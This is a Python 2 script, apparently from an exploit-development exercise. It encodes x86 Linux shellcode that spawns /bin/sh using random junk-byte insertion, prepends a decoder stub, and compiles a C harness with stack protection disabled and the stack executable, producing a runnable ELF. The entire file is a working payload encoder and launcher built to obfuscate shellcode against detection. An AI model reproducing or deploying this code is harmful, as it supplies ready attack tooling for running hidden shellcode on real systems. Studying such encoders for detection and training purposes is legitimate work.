#!/usr/bin/python


import struct
import os
import sys

if len(sys.argv) < 2:
	sys.exit("Usage: encode.py [output.elf]")

decoder = (
	"\xeb\x13\x5e\x8a\x16\x31\xc9\x8a\x5c\x0e\x02\x88\x1e"
	"\x46\x41\x38\xd1\x75\xf4\xeb\x05\xe8\xe8\xff\xff\xff"
)

shellcode = (
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d"
	"\x1c\x24\x50\x8d\x14\x24\x53\x8d\x0c\x24\xb0\x0b\xcd\x80"
)

if len(shellcode) > 0xff: sys.exit("Shellcode is too long.")


##### Encode using random byte insertion
#
#		byte[0]		--> length of shellcode
#		byte[odd]	--> junk
#		byte[even]	--> shellcode


junk = os.urandom(len(shellcode))

encoded = "\\x%02x" % len(shellcode)
encoded2 = "0x%02x," % len(shellcode)

for i in range(0, len(shellcode)):
	encoded += "\\x%02x\\x%02x" % (bytearray(junk)[i], bytearray(shellcode)[i])
	encoded2 += "0x%02x,0x%02x," % (bytearray(junk)[i], bytearray(shellcode)[i])



##### Generate an executable

skeleton = '''
#include<stdio.h>
#include<string.h>
unsigned char code[] = \
	"__DECODER__"
	"__SHELLCODE__";
void main()
{
	printf("Shellcode Length: %d\\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
'''

stub = ""
for d in bytearray(decoder):
	stub += "\\x%02x" % d

skeleton = skeleton.replace("__DECODER__", stub)
skeleton = skeleton.replace("__SHELLCODE__", encoded)

with open("a.c", "w") as f:
	f.write(skeleton)

os.system("gcc a.c -fno-stack-protector -z execstack")
os.rename("a.out", sys.argv[1])
os.remove("a.c")





print
print "[*] Original Shellcode Length: %d" % len(shellcode)
print "[*] Encoded Shellcode Length: %d" % (len(shellcode) * 2 + 1)
print "[*] Decoder Stub Length: %d" % len(decoder)
print "[*] Payload Length: %d" % (len(decoder) + (len(shellcode) * 2 + 1))
print
print "[+] Decoder Stub:\n\n%s" % stub
print
print "[+] Encoded Shellcode:\n\n%s\n\n%s" % (encoded, encoded2)
print
print "[+] Executable: %s" % sys.argv[1]
print
